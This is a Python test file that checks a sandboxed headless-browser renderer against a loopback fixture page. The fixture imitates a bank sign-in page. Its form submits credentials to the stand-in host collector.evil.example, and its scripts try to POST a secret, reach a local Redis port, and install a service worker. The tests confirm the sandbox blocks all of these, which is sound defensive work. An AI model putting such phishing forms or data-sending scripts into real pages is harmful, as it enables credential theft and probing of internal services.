"""The sandboxed renderer against a real headless Chromium, but only a fixture server on loopback: no request leaves this machine.
Skipped when Chromium is not installed (a CI box without it); the policy and supervisor are covered by test_probe_render_policy.py."""
import asyncio
import base64
import http.server
import json
import os
import sys
import threading

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "probe_worker"))
import render_job                                                         # noqa: E402

try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as _p:
        _HAVE_BROWSER = os.path.exists(_p.chromium.executable_path)
except Exception:                                                         # pragma: no cover
    _HAVE_BROWSER = False

pytestmark = pytest.mark.skipif(not _HAVE_BROWSER, reason="Chromium is not installed")

PAGE = b"""<html><head><title>Acme Bank - Sign in</title></head><body>
<h1>Welcome back to Acme</h1><div id=host></div>
<form action="https://collector.evil.example/post" method="post" name="f"><input name="method" value="x"><input type="text" name="u"><input type="password" name="p"></form>
<script>
  // a form that only exists after scripts run
  const f = document.createElement('div'); f.innerHTML = '<input type=password id=late>'; document.getElementById('host').appendChild(f);
  // a script that tries to send data out
  fetch('/steal', {method: 'POST', body: 'secret'}).catch(() => {});
  fetch('http://127.0.0.1:6379/', {mode: 'no-cors'}).catch(() => {});
  document.title = 'Acme Bank - Sign in';
  // a page trying to install a service worker so it keeps control of the browser
  navigator.serviceWorker.register('/sw.js').then(() => { document.getElementById('sw').textContent = 'SW_REGISTERED'; }, () => { document.getElementById('sw').textContent = 'SW_BLOCKED'; });
</script><p id=sw>SW_PENDING</p></body></html>"""


class _H(http.server.BaseHTTPRequestHandler):
    seen: list = []

    def log_message(self, *a):
        pass

    def do_GET(self):
        _H.seen.append(("GET", self.path))
        if self.path == "/":
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(PAGE)
        elif self.path == "/sw.js":
            self.send_response(200); self.send_header("Content-Type", "application/javascript"); self.end_headers(); self.wfile.write(b"self.addEventListener('fetch', () => {});")
        elif self.path == "/dl":
            self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers(); self.wfile.write(b"x" * 10)
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        _H.seen.append(("POST", self.path))
        self.send_response(200); self.end_headers()


@pytest.fixture()
def server():
    _H.seen = []
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _H)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield srv.server_address[1]
    srv.shutdown()


def _run(port):
    return asyncio.run(render_job.render("127.0.0.1", allow_private_for_tests=True, port=port))


def test_a_script_built_login_form_is_seen_and_nothing_is_ever_posted(server):
    out = _run(server)
    assert out["ok"] is True
    r = out["render"]
    assert r["title"] == "Acme Bank - Sign in" and "Welcome back to Acme" in r["text"]
    assert ["text", "text", "password"] in [f["inputs"] for f in r["forms"]]                                    # the static form
    assert any(f["action"] == "" and f["inputs"] == ["password"] for f in r["forms"])                           # the script-built field, outside any <form>
    assert not [s for s in _H.seen if s[0] == "POST"], _H.seen                                                  # a script's POST never reached the server
    assert r["blocked"] >= 1


def test_a_page_cannot_install_a_service_worker(server):
    text = _run(server)["render"]["text"]
    assert "SW_REGISTERED" not in text            # blocked: the registration never completes (with workers allowed this page reports SW_REGISTERED)


def test_the_screenshot_is_a_real_jpeg_within_the_cap(server):
    shot = base64.b64decode(_run(server)["render"]["screenshot_b64"])
    assert shot.startswith(b"\xff\xd8\xff") and len(shot) <= render_job.MAX_SHOT_BYTES


def test_form_attributes_cannot_be_shadowed_by_the_page(server):
    r = _run(server)["render"]
    static = next(f for f in r["forms"] if f["action"].startswith("https://collector.evil.example"))
    assert static["method"] == "post" and static["inputs"] == ["text", "text", "password"]                     # the <input name=method> did not change it


def test_an_unreachable_host_is_a_clean_failure_not_a_crash():
    out = asyncio.run(render_job.render("127.0.0.1", allow_private_for_tests=True, port=1))
    assert out["ok"] is False and out["error"]


def test_the_command_line_entry_refuses_a_non_hostname_and_private_addresses():
    for bad in ("127.0.0.1", "localhost", "a b.com", "http://x.com", "10.0.0.1", ""):
        out = asyncio.run(render_job.render(bad))
        assert out == {"ok": False, "error": "refused: not a plain hostname"}


def test_a_real_name_that_resolves_to_a_private_address_is_blocked_before_any_request(monkeypatch):
    from app.services import safe_fetch

    async def private(host):
        raise safe_fetch.FetchError("refused: the name points at a non-public address")
    monkeypatch.setattr(safe_fetch, "resolve_public", private)
    out = asyncio.run(render_job.render("looks-public.example"))
    assert out["ok"] is False
